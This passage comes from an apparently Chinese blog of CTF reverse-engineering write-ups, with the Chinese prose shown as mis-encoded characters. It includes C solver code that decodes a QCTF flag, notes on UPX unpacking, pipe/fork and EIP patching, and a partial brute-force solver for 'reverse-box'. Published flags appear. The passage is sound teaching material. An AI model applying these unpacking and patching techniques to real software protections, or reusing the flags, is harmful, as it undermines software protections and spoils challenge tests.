class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">30</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">24</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">21</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">18</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">10</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">8</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">12</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">17</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">23</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">13</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">4</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">14</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">19</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">11</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">20</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">16</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">15</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">5</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">25</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">36</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">27</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">28</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">29</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">37</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">31</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">32</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">33</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">26</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">34</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, a[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, temp = <span class="number">0</span>, lenth = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, c[<span class="number">2000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> count[<span class="number">127</span>] = &#123;<span class="number">0</span>&#125;, change_[<span class="number">38</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">fp = fopen(<span class="string">"out"</span>, <span class="string">"rb"</span>);      <span class="comment">//å…ˆä»æ–‡ä»¶è¯»å–å¯†æ–‡  </span></span><br><span class="line">lenth = fread(b, <span class="number">1</span>, <span class="number">100</span>, fp); <span class="comment">//è¿”å›è¯»å–æˆåŠŸä¸ªæ•°, ç¡®å®šå­—ç¬¦ä¸ªæ•°</span></span><br><span class="line">fclose(fp);</span><br><span class="line">    </span><br><span class="line">temp = b[lenth<span class="number">-1</span>]&amp;<span class="number">7</span>; <span class="comment">//&amp;7  å–åä¸‰ä½æ•°æ®.</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth; i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i] = (b[i] &gt;&gt; <span class="number">3</span>) | (temp &lt;&lt; <span class="number">5</span>);</span><br><span class="line">temp = b[i]&amp;<span class="number">7</span>;<span class="comment">//ä»æ•´ä½“æ¥çœ‹å°±æ˜¯å°†æ•´ä¸ªæ•°æ®å³ç§»åŠ¨3ä½</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">fp = fopen(<span class="string">"that_girl"</span>, <span class="string">"rb"</span>); <span class="comment">//æ‰“å¼€that_girl, ç»Ÿè®¡å­—ç¬¦æ•°.</span></span><br><span class="line">fread(c, <span class="number">1</span>, <span class="number">1742</span>, fp);</span><br><span class="line">fclose(fp); </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(c); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(c[i] &gt;= <span class="number">65</span> &amp;&amp; c[i] &lt;= <span class="number">90</span>)  </span><br><span class="line">c[i] += <span class="number">32</span>;<span class="comment">//å› ä¸ºä¸åŒºåˆ†å¤§å°å†™, éƒ½è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line"></span><br><span class="line">count[c[i]]++; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(A.change[i]) </span><br><span class="line">&#123;</span><br><span class="line">change_[j++] = A.change[i];  <span class="comment">//ç»Ÿè®¡æ¯ä¸ªå­—ç¬¦å‡ºç°æ¬¡æ•°</span></span><br><span class="line">i = A.change[i];  </span><br><span class="line">&#125;</span><br><span class="line">j -= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">temp = a[<span class="number">0</span>], a[<span class="number">0</span>] = a[change_[j]];  <span class="comment">//ç¬¬äºŒå±‚è§£å¯†</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth<span class="number">-2</span>; i++) <span class="comment">//æŒ‰ç…§ç»™å®šèµ‹å€¼æ‰¾åˆ°ä¸€ä¸ªæœªå˜çš„å€¼, å€’åºèµ‹å€¼å›å»å³å¯</span></span><br><span class="line">&#123;</span><br><span class="line">a[change_[j]] = a[change_[--j]];</span><br><span class="line">&#125;</span><br><span class="line">a[change_[j]] = temp; </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth; i++)<span class="comment">//ç¬¬ä¸‰å±‚è§£å¯†,æ¯”å¯¹æ¯ä¸ªå­—ç¬¦å‡ºç°çš„æ¬¡æ•°çš„é¡ºåº,è¿›è€Œç¡®å®šè¾“å…¥é¡ºåº</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] == count[j])</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = j; </span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"QCTF&#123;%s&#125;"</span>, flag); <span class="comment">//å¾—åˆ°flag.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515135919513-1591166487828.png" alt="image-20200515135919513"></p><p><strong>æ€»ç»“: (1ï¼‰ç®—æ³•å¥½çš„è¯, è¿™é“é¢˜å°±è½»æ¾å¾ˆå¤šã€‚(2)æ³¨æ„64ä½ç¨‹åºçš„ä¼ é€’å‚æ•°çš„æ–¹å¼ã€‚</strong></p><h3 id="easyre-153"><a href="#easyre-153" class="headerlink" title="easyre-153"></a>easyre-153</h3><blockquote><p>é¢˜å…¶å®å¾ˆç®€å•,  èƒ½çŒœåˆ°flagæ€ä¹ˆç®—å‡ºæ¥, ä½†å¯¹ç¨‹åºçš„æ‰§è¡Œæƒ³ä¸æ˜ç™½ï¼ŒèŠ±äº†äº›æ—¶é—´ã€‚</p></blockquote><p>32ä½elfæ–‡ä»¶åŠ äº†upxå£³, æ²¡æœ‰ä¿®æ”¹è¿‡çš„, ç›´æ¥upx -dè„±å£³æˆåŠŸ.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515184107394-1591167002031.png" alt="image-20200515184107394"></p><p>idaæ‰“å¼€, æ‰¾åˆ°ä¸»å‡½æ•°. ä¸€å¼€å§‹å°±è®¤ä¸ºç›´æ¥åŠ¨è·³æ§åˆ¶å‡½æ•°çš„èµ°å‘, åˆ°æœ€åä¸€ä¸ª <strong>lol</strong> å‡½æ•°å¾—åˆ°flag. ä½†æ˜¯åŠ¨æ€æ€»æ˜¯åœ¨readå‡½æ•°å¡ä½, èµ°ä¸äº†, ä½†è¿™é‡Œæˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥è·³,å› ä¸ºè¿™ä¸ªå‡½æ•°æ˜¯å‘<strong>buf</strong>å†™å†…å®¹, æˆ‘ä»¬æœ€åçš„flagæ˜¯è¦ä½¿ç”¨bufçš„å†…å®¹. ç„¶ååˆè½¬ GDB è°ƒè¯•, åŒç„¶çš„ç»“æœ.    çº³é—·è¿™é¢˜äº†, å®ƒåˆ°åº•æ˜¯è¦åšä»€ä¹ˆ. å…¶å®çŒœä¹Ÿæ˜¯æŠŠä¸Šé¢ writeçš„é‚£éƒ¨åˆ†æ•°æ®ä½œä¸º buf çš„å†…å®¹, ç„¶ååœ¨lolå‡½æ•°å¾—åˆ° flag.  ä½†é—®é¢˜æ˜¯ ç¨‹åºåˆ°åº•åœ¨æä»€ä¹ˆâ€¦..</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515185409497-1591167023660.png" alt="image-20200515185409497"></p><p>çœŸçš„åšåˆ°è‡ªé—­, åæ¥æ‰å‘ç°æˆ‘å¿½ç•¥ä¸Šé¢çš„ pipe()å‡½æ•°ä¸fork()å‡½æ•°. ç¬¬ä¸€æ¬¡è§åˆ°, ç™¾åº¦äº†ä¸‹, æ˜ç™½äº†â€¦</p><blockquote><p>é¦–å…ˆæ˜¯ç®¡é“: 1.å…¶æœ¬è´¨æ˜¯ä¸€ä¸ªä¼ªæ–‡ä»¶(å®ä¸ºå†…æ ¸ç¼“å†²åŒº)</p><p>â€‹                     2.ç”±ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦å¼•ç”¨ï¼Œä¸€ä¸ªè¡¨ç¤ºè¯»ç«¯ï¼Œä¸€ä¸ªè¡¨ç¤ºå†™ç«¯ã€‚</p><p>â€‹                     3.è§„å®šæ•°æ®ä»ç®¡é“çš„å†™ç«¯æµå…¥ç®¡é“ï¼Œä»è¯»ç«¯æµå‡º</p><p>pipe()å‡½æ•°ç”¨äºåˆ›å»ºç®¡é“: 1.int pipe(int pipefd[2]); æˆåŠŸï¼š0ï¼›å¤±è´¥ï¼š-1ï¼Œè®¾ç½®errno</p><p>â€‹                                           2.å‡½æ•°è°ƒç”¨æˆåŠŸè¿”å›r/wä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚æ— éœ€openï¼Œä½†éœ€æ‰‹åŠ¨close</p><p>â€‹                                           3.è§„å®šï¼šfd[0] â†’ rï¼› fd[1] â†’ wï¼Œå°±åƒ0å¯¹åº”æ ‡å‡†è¾“å…¥ï¼Œ1å¯¹åº”æ ‡å‡†è¾“å‡ºä¸€æ ·ã€‚</p><p>â€‹                                           4.å‘ç®¡é“æ–‡ä»¶è¯»å†™æ•°æ®å…¶å®æ˜¯åœ¨è¯»å†™å†…æ ¸ç¼“å†²åŒº</p><p><strong>è¿™é‡Œå°±æ˜¯é€šè¿‡pipedes[1]å†™è¿›å†…å®¹,  ä»pipedes[0]å†™å‡º.</strong>                    </p></blockquote><blockquote><p>ç„¶åfork()å‡½æ•°. 1.forkï¼ˆï¼‰å‡½æ•°é€šè¿‡ç³»ç»Ÿè°ƒç”¨åˆ›å»ºä¸€ä¸ªä¸åŸæ¥è¿›ç¨‹å‡ ä¹å®Œå…¨ç›¸åŒçš„è¿›ç¨‹ï¼Œ</p><p>â€‹                            ä¹Ÿå°±æ˜¯ä¸¤ä¸ªè¿›ç¨‹å¯ä»¥åšå®Œå…¨ç›¸åŒçš„äº‹ï¼Œä½†å¦‚æœåˆå§‹å‚æ•°æˆ–è€…ä¼ å…¥çš„å˜é‡ä¸åŒï¼Œä¸¤ä¸ªè¿›ç¨‹                            ä¹Ÿå¯ä»¥åšä¸åŒçš„äº‹</p><p>â€‹                           2.ä¸€ä¸ªè¿›ç¨‹è°ƒç”¨forkï¼ˆï¼‰å‡½æ•°åï¼Œç³»ç»Ÿå…ˆç»™æ–°çš„è¿›ç¨‹åˆ†é…èµ„æºï¼Œä¾‹å¦‚å­˜å‚¨æ•°æ®å’Œä»£ç çš„ç©º                           é—´ã€‚ç„¶åæŠŠåŸæ¥çš„è¿›ç¨‹çš„æ‰€æœ‰å€¼éƒ½å¤åˆ¶åˆ°æ–°çš„æ–°è¿›ç¨‹ä¸­ï¼Œåªæœ‰å°‘æ•°å€¼ä¸åŸæ¥çš„è¿›ç¨‹å€¼                           ä¸åŒã€‚ç›¸å½“äºå…‹éš†äº†ä¸€ä¸ªè‡ªå·±</p><p>â€‹                           3.è°ƒç”¨forkå‡½æ•°ä¸€æ¬¡, è¿”å›2æ¬¡å€¼, è‹¥è¿”å›0åˆ™æ˜¯å­è¿›ç¨‹, è‹¥æ˜¯ä¸€ä¸ªæ•°åˆ™æ˜¯çˆ¶è¿›ç¨‹çš„è¿›ç¨‹å·.</p><p><strong>æ‰€ä»¥è¿™é‡Œå°±æ˜¯å…ˆåˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹,è¿”å›å€¼v5 == 0, è¿›å…¥å­è¿›ç¨‹å®Œæˆå†™å…¥æ•°æ®åç»“æŸè¿›ç¨‹, fork()è¿”å›æ–°çš„å€¼çˆ¶è¿›ç¨‹è¿›ç¨‹å·,ç„¶åæ‰§è¡Œåé¢çš„æ“ä½œ.</strong>        </p></blockquote><p>è¿™é‡ŒåŠ¨æ€è°ƒè¯•è¿™ç§åˆ›å»ºè¿›ç¨‹çš„ç¨‹åºæ˜¯ä¸é€šç•…çš„. é‚£å°±é€šè¿‡ä¿®æ”¹ç¨‹åº EIP, æŒ‰ç…§æœ¬æ¥è¦æ‰§è¡Œçš„é¡ºåºæ‰§è¡Œä¸€éå¾—åˆ°flag.(æ³¨æ„è¿™æ ·å¯èƒ½ä¼šæœ‰ä¸€ä¸ªé—®é¢˜: æ ˆä¸å¹³è¡¡, å› ä¸ºå‡½æ•°æ²¡æœ‰æ­£å¸¸è¿”å›, é‚£ä¼šå½±å“ä¸€äº›å‡½æ•°, æ¯”å¦‚scanf()å‡½æ•°æ‰§è¡Œåˆ°äº†, ä¸ä¼šè®©æˆ‘ä»¬è¾“å…¥, è€Œæ˜¯ç›´æ¥è·³è¿‡, è¿™å°±æ˜¯å †æ ˆæœ‰å€¼å®ƒå°±ç›´æ¥è¯»å–äº†)</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515193103677-1591167041257.png" alt="image-20200515193103677"></p><p><strong>æ€»ç»“:(1)å¯¹äºç›²åŒºçš„çŸ¥è¯†, æèµ·æ¥è¿˜æ˜¯éº»çƒ¦ï¼Œç§¯ç´¯å§ã€‚ (2)ç†Ÿæ‚‰äº†ä¿®æ”¹ EIPã€‚</strong> </p><h3 id="76å·å…¬è·¯"><a href="#76å·å…¬è·¯" class="headerlink" title="76å·å…¬è·¯"></a>76å·å…¬è·¯</h3><p>é¢˜ç›®çœ‹ä¼¼å¾ˆéš¾çš„æ ·å­, ä½†è‡ªå·±ç¡®å®è¢«é¢˜ç›®çš„ä¿¡æ¯è¯¯å¯¼äº†.</p><p>ä¸‹è½½å, 2ä¸ªæ–‡æœ¬ä¸€ä¸ª32ä½æ— å£³elfæ–‡ä»¶, å¹¶ä¸”é¢˜ç›®ä¿¡æ¯å°±ç»™äº† <strong>æˆ‘ä»¬è®¤ä¸ºæœ‰ä»½ç¡®åˆ‡çš„æ–‡æ¡£è®°å½•äº†æ¯ä¸ªåŒºåŸŸçš„åŠŸèƒ½ï¼Œè¯·ååŠ©æ‰¾å‡º</strong> è¿™ä¸ªæç¤º, æ‰€ä»¥è‡ªå·±åšé¢˜æ—¶å§‹ç»ˆæƒ³åˆ°æ€ä¹ˆå’Œæ–‡æœ¬è”ç³»èµ·æ¥, æ‰¾çº¿ç´¢. ä½†å…¶å®ä¸ç„¶</p><p>è½½å…¥idaå, æœç´¢äº†ä¸‹å­—ç¬¦ä¸², æ‰¾åˆ°äº†ä¸»å‡½æ•°, ä½†æ˜¯ä¸èƒ½è½¬åŒ–ä¸ºä¼ªä»£ç ,  å› ä¸ºä¹‹å‰äº†è§£è¿‡ç‚¹èŠ±æŒ‡ä»¤,å…¶ä¸­  <strong>E0</strong> æ€»æ˜¯å¹²æ‰°ä»£ç çš„. æ”¹ä¸º <strong>90</strong> nopæ‰å°±å¯ä»¥äº†. </p><p>è¿™é‡ŒåŒæ ·. æ”¹å®Œå, å¼€å§‹è¯»æ±‡ç¼–ä»£ç , é€»è¾‘å¾ˆç®€å•, å°±æ˜¯æç¤º, è®©æˆ‘ä»¬è¾“å…¥å­—ç¬¦, è¿›å»ä¸€ä¸ªå‡½æ•°åˆ¤æ–­.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200521123259003-1591167068213.png" alt="image-20200521123259003"></p><p>è¿›å»åˆ¤æ–­å‡½æ•°, å¯ä»¥æŸ¥çœ‹ä¼ªä»£ç çš„. åˆ†æä¸€ä¸‹å°±çŸ¥é“æ˜¯è·Ÿç€ä¸€æ¡çº¿æŒ‰ç…§é¡ºåºæ£€ç´¢æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸². ä½†æ˜¯æ€ä¹ˆæ‰¾é¡ºåºå‘¢, å› ä¸ºæ–‡æœ¬æ–‡ä»¶è¿˜æ²¡ç”¨, æˆ‘å°±å§‹ç»ˆè®¤ä¸ºåœ¨æ–‡æœ¬æ–‡ä»¶æ‰¾, æ‰¾äº†åŠå¤©â€¦â€¦.æ— æœ</p><p>æœ€åå›åˆ°ç¨‹åºå‘ç°, å¯ä»¥æ‰¾åˆ°å…¥å£ç‚¹, é¡ºè—¤æ‘¸ç“œçš„å°±å¯ä»¥æ‰¾åˆ°äº†å•Š. å¯ä»¥çŸ¥é“ä»ç´¢å¼• <strong>v2</strong> ä»0å¼€å§‹, ç›´æ¥ä»è¿™é‡Œå‡ºå‘å°±å¥½äº†. ç›´åˆ°æ­£ç¡®é€€å‡ºå¾ªç¯.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200521123808376-1591167075180.png" alt="image-20200521123808376"></p><p>æœ€åå¾—åˆ°flag: <strong>flag{09vdf7wefijbk}</strong>.</p><p><strong>æ€»ç»“: (1)ä¸è¦è®©é¢˜ç›®æŠŠè‡ªå·±çš„æ€è·¯å¸¦åäº†, æ€ç»´è¦å‘æ•£ä¸€äº›.</strong>  </p><h3 id="reverse-box"><a href="#reverse-box" class="headerlink" title="reverse-box"></a>reverse-box</h3><p>é¢˜ç›®ä¸‹è½½ä¸‹æ¥ï¼Œå¼„åŠå¤©å§‹ç»ˆè§‰å¾—æœ‰é—®é¢˜ã€‚ç™¾åº¦å‘ç°é¢˜ç›®å°‘ç»™äº†è¾“å‡ºå­—ç¬¦ä¸²ã€‚</p><p>å¼€å§‹å†æ¬¡çœ‹é¢˜ï¼Œè¢«è‡ªå·±å‘æƒ¨äº†ã€‚ã€‚ã€‚å› ä¸ºç”Ÿæˆæ•°æ®è¡¨çš„å‡½æ•°ä¸­è‡ªå·±åªçœ‹åˆ°äº†ç”Ÿæˆçš„éšæœºæ•°èµ‹å€¼äº†ç»™äº†æ•°æ®è¡¨çš„ç¬¬ä¸€æ¬¡å…ƒç´ ï¼Œé‚£æ•´ä¸ªé¢˜å°±æœ‰ç‚¹å¥‡æ€ªäº†ã€‚çœ‹äº†åˆçœ‹ï¼Œæ‰å‘å…ˆæœ€åç”¨åˆ°äº†éšæœºæ•°ç”Ÿæˆæ•°æ®çš„ï¼Œåªæ˜¯å±å¹•å®¹ä¸ä¸‹äº†ã€‚ã€‚ã€‚</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200528115958609-1591167079725.png" alt="image-20200528115958609"></p><p>å¦å¤–å°±æ˜¯å…ˆå°†æ¯æ¬¡ç”Ÿæˆç´¢å¼•å€¼ v7 ç”¨Cè¯­è¨€å†™å‡ºæ¥åæ‰“å°çœ‹çœ‹ï¼Œ ä½†å¤§å¤šæ•°æ˜¯è´Ÿæ•°ï¼Œå¾ˆå¤§çš„æ•°ã€‚è¿™æ˜¾ç„¶ä¸å¯¹çš„ï¼Œå› ä¸ºæˆ‘ä»¬è¿è¡Œç¨‹åºæ—¶è¾“å…¥çš„å‚æ•°éƒ½æ˜¯å¯æ‰“å°å­—ç¬¦ ï¼ˆASCII: 32-127ï¼‰ï¼Œä¼ªä»£ç ä¸é è°±ï¼Œæœæ–­å»çœ‹çœ‹äº†æ±‡ç¼–ã€‚</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200528121109201-1591167091052.png" alt="image-20200528121109201"></p><p>å¦å¤–å°±æ˜¯ ä¼ªä»£ç ä¸­çš„ __ROR__äº†ï¼Œçœ‹äº†æ±‡ç¼–çŸ¥é“äº† ror æŒ‡ä»¤ï¼Œå°†æ•°æ®æƒ³å³ä½ç§»åŠ¨æŒ‡å®šçš„ä½æ•°ã€‚ä»¥ä¸ºåªæ˜¯ç®€å•çš„  &gt;&gt; ï¼Œå°±è¿™æ ·å†™äº†æ•´ä¸ªé¢˜çš„çˆ†ç ´ä»£ç ã€‚ä½†æ˜¯å§‹ç»ˆä¸å¯¹ï¼ŒèŠ±äº†å¾ˆæ—¶é—´ï¼Œä¸ç”˜å¿ƒï¼Œå°±idaä¸­åŠ¨è°ƒï¼ŒCè¯­è¨€ä¸­è°ƒè¯•ï¼Œæ¯ä¸ªæ­¥éª¤å¯¹æ¯”ç»“æœï¼Œæ‰æ‰¾åˆ°æ˜¯ ror è¿™é‡Œé”™äº†ã€‚ã€‚ã€‚ åŸæ¥ ror æ˜¯å³ç§»åŠ¨ä½åä¼šæŠŠå¤šä½™çš„ä½ç§»åŠ¨åˆ°æœ€å·¦è¾¹ï¼Œå³ä¸€ä¸ªåœ†åœˆè½¬ï¼Œè¿™æ˜¯å¾ªç¯ç§»ä½ã€‚</p><p>exp: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">generate</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> *result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> v7 = <span class="number">1</span>, v2 = <span class="number">0</span>, v3 = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> v4 = <span class="number">0</span>, v5 = <span class="number">0</span>, v8 = <span class="number">1</span>, v9 = <span class="number">0</span>;</span><br><span class="line">result[<span class="number">0</span>] = a;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v2 = v7 ^ <span class="number">2</span> * v7;</span><br><span class="line"><span class="keyword">if</span>((v7 &amp; <span class="number">0x80</span>) == <span class="number">0</span>)</span><br><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">v3 = <span class="number">27</span>;</span><br><span class="line">        </span><br><span class="line">v7 = v2 ^ v3;</span><br><span class="line">v7 = v7 &amp; <span class="number">0xFF</span>; </span><br><span class="line">        v4 = (<span class="number">4</span> * (<span class="number">2</span> * v8 ^ v8) ^ <span class="number">2</span> * v8 ^ v8)&amp;<span class="number">0xff</span>;</span><br><span class="line">        v9 = ((<span class="number">16</span> * v4 ^ v4)&amp;<span class="number">0xff</span>);</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> ( v9 &gt;= <span class="number">0</span> &amp;&amp; v9 &lt;= <span class="number">127</span> )</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v5 = <span class="number">9</span>;</span><br><span class="line">    v8 = (v9 ^ v5);</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span>(v7 &lt; <span class="number">127</span>)</span><br><span class="line">    result[v7] = (((v8 &gt;&gt; <span class="number">4</span>) | ((v8 &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">4</span>)) ^ ((v8 &gt;&gt; <span class="number">5</span>) | ((v8&amp;<span class="number">0x1F</span>) &lt;&lt; <span class="number">3</span>)) ^ ((v8 &gt;&gt; <span class="number">6</span>) | ((v8&amp;<span class="number">0x3F</span>)&lt;&lt;<span class="number">2</span>) ) ^ ((v8 &gt;&gt; <span class="number">7</span>) | ((v8&amp;<span class="number">0xFF</span>)&lt;&lt;<span class="number">1</span>) ) ^ (v8 ^ a))&amp;<span class="number">0xff</span>;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">while</span>(v7 != <span class="number">1</span>); </span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *result = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">127</span>);</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, value = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> a[] = <span 